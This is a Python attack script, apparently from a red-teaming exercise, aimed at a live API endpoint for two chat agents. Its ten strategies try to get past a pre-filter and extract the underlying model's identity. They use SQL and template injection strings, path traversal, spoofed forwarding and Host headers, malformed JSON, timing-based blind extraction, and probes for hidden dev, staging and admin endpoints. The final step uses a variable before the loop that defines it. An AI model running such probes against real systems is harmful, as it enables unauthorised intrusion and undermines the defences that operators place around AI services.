#!/usr/bin/env python3
"""
CREATIVE TIMEOUT BYPASS STRATEGIES
New approaches based on timeout defense analysis
"""
import requests
import json
import time

BASE = "https://6ofr2p56t1.execute-api.us-east-1.amazonaws.com/prod/api"

def attack(agent, msg, **kwargs):
    try:
        r = requests.post(f"{BASE}/{agent}", json={"message": msg}, **kwargs)
        return r.json().get("response", ""), r.status_code, True
    except Exception as e:
        return str(e), 504, False

print("💡 CREATIVE TIMEOUT BYPASS STRATEGIES")
print("="*80)

# STRATEGY 1: SQL/NoSQL Injection (might bypass pre-filter)
print("\n[1] INJECTION ATTACKS (bypass pre-filter)")
injection_attacks = [
    "'; SELECT model_name; --",
    "' OR '1'='1",
    "admin' --",
    "${MODEL}",
    "{{model}}",
    "../../model",
    "../config/model",
    "\\x00model",  # Null byte injection
]

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    for inj in injection_attacks:
        resp, status, success = attack(agent, inj, timeout=3)
        if success and status != 504:
            print(f"  🎯 INJECTION HIT: '{inj}' → {resp[:100]}")

# STRATEGY 2: Protocol-level attacks
print("\n[2] PROTOCOL MANIPULATION")
# Try different HTTP methods
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # GET instead of POST
    try:
        r = requests.get(f"{BASE}/{agent}?message=model", timeout=3)
        if r.status_code != 504:
            print(f"  🎯 GET METHOD: {r.status_code} → {r.text[:100]}")
    except:
        print(f"  ❌ GET: TIMEOUT")

    # PUT
    try:
        r = requests.put(f"{BASE}/{agent}", json={"message": "m"}, timeout=3)
        if r.status_code != 504:
            print(f"  🎯 PUT METHOD: {r.status_code} → {r.text[:100]}")
    except:
        print(f"  ❌ PUT: TIMEOUT")

    # PATCH
    try:
        r = requests.patch(f"{BASE}/{agent}", json={"message": "m"}, timeout=3)
        if r.status_code != 504:
            print(f"  🎯 PATCH METHOD: {r.status_code} → {r.text[:100]}")
    except:
        print(f"  ❌ PATCH: TIMEOUT")

# STRATEGY 3: Malformed JSON (might crash pre-filter)
print("\n[3] MALFORMED JSON")
malformed = [
    '{"message":',  # Incomplete
    '{"message"}',  # Invalid
    '{"msg": "m"}',  # Wrong field
    '{"MESSAGE": "m"}',  # Case variation
    '{"message": null}',  # Null
    '{}',  # Empty object
    'null',  # Just null
    '[]',  # Array instead
]

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    for mal in malformed:
        try:
            r = requests.post(f"{BASE}/{agent}",
                            data=mal,
                            headers={'Content-Type': 'application/json'},
                            timeout=3)
            if r.status_code != 504:
                print(f"  🎯 MALFORMED HIT: {mal[:30]} → {r.status_code} {r.text[:80]}")
        except:
            pass

# STRATEGY 4: Header injection
print("\n[4] HEADER INJECTION")
header_attacks = [
    {'X-Original-Message': 'model'},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Forwarded-Host': 'localhost'},
    {'X-Override-Message': 'model'},
    {'X-Debug': 'true'},
    {'X-Bypass': 'true'},
]

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    for headers in header_attacks:
        resp, status, success = attack(agent, "m", headers=headers, timeout=3)
        if success and status != 504:
            print(f"  🎯 HEADER HIT: {headers} → {resp[:100]}")

# STRATEGY 5: DNS rebinding / Host header manipulation
print("\n[5] HOST HEADER MANIPULATION")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    hosts = [
        'localhost',
        '127.0.0.1',
        'internal.api',
        '0.0.0.0',
    ]
    for host in hosts:
        try:
            r = requests.post(f"{BASE}/{agent}",
                            json={"message": "m"},
                            headers={'Host': host},
                            timeout=3)
            if r.status_code != 504:
                print(f"  🎯 HOST HIT: {host} → {r.status_code}")
        except:
            pass

# STRATEGY 6: Timing-based blind extraction
print("\n[6] TIMING-BASED BLIND EXTRACTION")
# If response times vary based on model, we can extract bit by bit
models = ['gpt-4', 'claude', 'gemini', 'llama']

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    timings = {}
    for model in models:
        start = time.time()
        try:
            requests.post(f"{BASE}/{agent}",
                         json={"message": f"Are you {model}?"},
                         timeout=3)
        except:
            pass
        duration = time.time() - start
        timings[model] = duration
        print(f"  ⏱️  {model}: {duration:.4f}s")

    # Check if any timing significantly different
    avg = sum(timings.values()) / len(timings)
    for model, dur in timings.items():
        if abs(dur - avg) > 0.2:
            print(f"  🎯 TIMING ANOMALY: {model} ({dur:.4f}s vs {avg:.4f}s avg)")

# STRATEGY 7: WebSocket upgrade
print("\n[7] WEBSOCKET UPGRADE")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    try:
        r = requests.get(f"{BASE}/{agent}",
                        headers={
                            'Upgrade': 'websocket',
                            'Connection': 'Upgrade',
                            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                            'Sec-WebSocket-Version': '13'
                        },
                        timeout=3)
        if r.status_code != 504:
            print(f"  🎯 WEBSOCKET: {r.status_code} → {r.text[:100]}")
    except:
        print(f"  ❌ WEBSOCKET: Failed")

# STRATEGY 8: Content-Type variations
print("\n[8] CONTENT-TYPE VARIATIONS")
content_types = [
    'text/plain',
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'application/xml',
    'text/xml',
]

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    for ct in content_types:
        try:
            r = requests.post(f"{BASE}/{agent}",
                            data="message=model",
                            headers={'Content-Type': ct},
                            timeout=3)
            if r.status_code != 504:
                print(f"  🎯 CONTENT-TYPE HIT: {ct} → {r.status_code}")
        except:
            pass

# STRATEGY 9: URL encoding variations
print("\n[9] URL ENCODING BYPASS")
url_encoded_messages = [
    "%6D%6F%64%65%6C",  # "model" in URL encoding
    "%6d%6f%64%65%6c",  # lowercase hex
    "%u006D%u006F%u0064%u0065%u006C",  # Unicode escape
]

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    for enc in url_encoded_messages:
        resp, status, success = attack(agent, enc, timeout=3)
        if success and status != 504:
            print(f"  🎯 URL-ENCODE HIT: {resp[:100]}")

# STRATEGY 10: Direct API Gateway bypass
print("\n[10] API GATEWAY BYPASS ATTEMPTS")
# Try to hit Lambda directly if we can guess the function name
bypass_urls = [
    f"{BASE.replace('/prod', '/dev')}/{agent}",  # Dev environment
    f"{BASE.replace('/prod', '/staging')}/{agent}",  # Staging
    f"{BASE.replace('/api', '/admin')}/{agent}",  # Admin endpoint
    f"{BASE}/{agent}/health",  # Health check
    f"{BASE}/{agent}/status",  # Status
    f"{BASE}/{agent}/info",  # Info
]

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    for url in bypass_urls:
        try:
            r = requests.get(url, timeout=3)
            if r.status_code != 504 and r.status_code != 404:
                print(f"  🎯 BYPASS HIT: {url} → {r.status_code}")
        except:
            pass

print("\n" + "="*80)
print("✅ CREATIVE BYPASS COMPLETE")
print("="*80)
